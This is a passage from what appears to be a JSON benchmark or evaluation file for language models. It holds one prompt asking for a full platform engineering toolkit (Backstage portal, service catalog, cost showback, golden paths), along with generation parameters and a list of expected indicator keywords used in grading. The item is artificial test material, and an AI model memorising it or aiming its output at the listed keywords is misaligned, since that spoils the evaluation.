          "content": "\nBuild a complete platform engineering toolkit:\n1. Create developer portal with Backstage\n2. Implement service catalog with templates\n3. Build automated environment provisioning\n4. Create cost allocation and showback\n5. Implement developer productivity metrics\n6. Build self-service infrastructure\n7. Create platform API abstractions\n8. Implement golden paths for common use cases\n9. Build platform health dashboard\n10. Create platform documentation generator\nInclude all code, configurations, and templates.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    }
  ]
}